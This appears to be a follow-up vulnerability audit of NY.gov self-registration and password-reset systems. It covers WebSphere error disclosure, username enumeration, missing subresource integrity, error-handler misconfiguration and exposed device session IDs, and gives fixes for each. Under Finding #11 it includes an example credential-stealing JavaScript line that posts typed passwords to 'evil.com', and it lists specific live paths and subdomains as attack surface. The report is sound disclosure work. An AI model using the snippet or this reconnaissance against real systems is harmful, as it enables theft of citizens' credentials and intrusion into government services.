# Additional Security Blind Spots - NY.gov Systems

**Audit Date:** January 3, 2026  
**Follow-up to:** VULNERABILITY_REPORT_FULL.md

---

## New Findings Summary

| # | Severity | Vulnerability | System |
|---|----------|---------------|--------|
| 9 | **HIGH** | IBM WebSphere Stack Disclosure | SelfRegV3 |
| 10 | **MEDIUM** | Password Reset User Enumeration | FPSV4 |
| 11 | **MEDIUM** | Missing Subresource Integrity (SRI) | All Sites |
| 12 | **LOW** | Broken Error Handler Configuration | All Sites |
| 13 | **LOW** | Device Session ID Exposure | SelfRegV3 |

---

## Finding #9: IBM WebSphere Stack Disclosure

**Severity:** HIGH  
**Path:** `https://my.ny.gov/SelfRegV3/error`  
**CWE:** CWE-200 (Information Exposure)

### Description
Server error pages expose specific technology stack information:

```
Error 404: java.io.FileNotFoundException: SRVE0190E: File not found: /error
```

### Evidence
- `SRVE0190E` is specific to **IBM WebSphere Application Server**
- Confirms backend is Java-based
- Error code can be mapped to specific WebSphere versions

### Impact
Attackers can:
- Research known WebSphere vulnerabilities
- Craft targeted exploits for this specific platform
- Identify compatible attack tools

### Recommendation
- Configure custom error pages that hide server details
- Return generic "Page not found" messages
- Log detailed errors server-side only

---

## Finding #10: Password Reset User Enumeration

**Severity:** MEDIUM  
**Path:** `https://my.ny.gov/FPSV4/fps.xhtml`  
**CWE:** CWE-203 (Observable Discrepancy)

### Description
The forgot password flow reveals whether a username exists in the system.

### Evidence
```
Input: nonexistent_user_12345
Response: "No account found for the entered Username"
```

This is SEPARATE from the registration enumeration (Finding #3) - the password reset flow has its own enumeration vulnerability.

### Attack Scenario
1. Attacker enters username in password reset form
2. System reveals if account exists
3. Valid accounts can be targeted for password spraying
4. Or social engineering attacks

### Recommendation
- Generic response: "If this account exists, you'll receive reset instructions"
- Same response timing for valid/invalid accounts
- Rate limiting on password reset attempts

---

## Finding #11: Missing Subresource Integrity (SRI)

**Severity:** MEDIUM  
**Affected:** All NY.gov properties  
**CWE:** CWE-353 (Missing Integrity Check)

### Description
Critical third-party JavaScript is loaded without integrity verification.

### Vulnerable Scripts

| Script | Host | Risk |
|--------|------|------|
| `device-risk-sdk.js` | sdk.dv.socure.us | **CRITICAL** - Identity verification |
| `recaptcha/enterprise.js` | google.com | HIGH - Bot protection bypass |
| `unav-bundle.js` | static-assets.ny.gov | MEDIUM - UI manipulation |
| Other scripts | Various | 8/9 scripts lack SRI |

### Impact
If ANY of these third-party providers are compromised:
- Attackers could inject credential-stealing code
- Identity verification could be bypassed
- User sessions could be hijacked
- All without any detection

### Example Attack
```javascript
// If Socure CDN is compromised, attacker could add:
document.querySelector('input[type="password"]').addEventListener('input', 
  e => fetch('https://evil.com/steal', {method: 'POST', body: e.target.value})
);
```

### Recommendation
Add SRI hashes to all third-party scripts:
```html
<script src="https://example.com/script.js" 
        integrity="sha384-..." 
        crossorigin="anonymous"></script>
```

---

## Finding #12: Broken Error Handler Configuration

**Severity:** LOW  
**Affected:** All NY.gov properties  
**CWE:** CWE-756 (Missing Custom Error Page)

### Description
The server's error document handler is misconfigured:

```
Additionally, a 404 Not Found error was encountered while trying to use 
an ErrorDocument to handle the request.
```

### Impact
- Double error exposure (original error + error handler error)
- Indicates poor system configuration
- May reveal additional information in certain conditions

### Recommendation
- Fix Apache/WebSphere error document configuration
- Ensure custom error pages actually exist and are accessible
- Test error handling in staging before production

---

## Finding #13: Device Session ID Exposure

**Severity:** LOW  
**Affected:** SelfRegV3 registration  
**CWE:** CWE-200 (Information Exposure)

### Description
Device fingerprinting session IDs are exposed in multiple locations:

| Location | Field Name | Length |
|----------|------------|--------|
| Cookie | `_s_did` | 206 chars |
| Hidden Field | `selfregform:deviceSessionId` | 206 chars |

### Impact
- Increases attack surface for session-related attacks
- Device fingerprint could be extracted and replayed
- Used by Socure for identity verification

### Recommendation
- Minimize exposure of device fingerprinting data
- Ensure values are not logged in URLs or referrer headers
- Consider server-side-only handling

---

## Subdomain Enumeration (For Manual Testing)

The following subdomains should be audited separately:

```
api.ny.gov
dev.ny.gov
staging.ny.gov
test.ny.gov
admin.ny.gov
portal.ny.gov
apps.ny.gov
services.ny.gov
```

These were not tested in this automated audit but represent potential attack surfaces.

---

## robots.txt Analysis

```
User-agent: *
Disallow: /
```

### Finding
Global crawl prevention is in place, but this:
- Does not prevent direct navigation
- Does not hide known paths
- Is "security through obscurity"

---

## Full Vulnerability Count

| Severity | Count | Findings |
|----------|-------|----------|
| CRITICAL | 2 | Session in URL, SSN Bug |
| HIGH | 3 | User Enumeration, CAPTCHA Bug, WebSphere Disclosure |
| MEDIUM | 4 | Clickjacking, Resource Failures, Password Reset Enum, Missing SRI |
| LOW | 4 | Headers, Build Info, Error Handler, Device Session |
| **TOTAL** | **13** | |

---

## Audit Methodology - Blind Spots

### Tests Performed
- [x] robots.txt analysis
- [x] Password reset flow enumeration
- [x] Third-party script SRI verification
- [x] Error page information harvesting
- [x] Cookie security analysis
- [x] Hidden form field analysis
- [x] CORS misconfiguration testing
- [x] WebSocket connection analysis
- [x] Meta tag security review
- [x] Device fingerprint exposure check
- [x] API endpoint discovery
- [x] Local/Session storage audit

---

## Contact

**Security Researcher:** Brian Sanders  
**Email:** shaqsanders73@gmail.com  
**GitHub:** https://github.com/barkleesanders/nygov-selfreg-fix
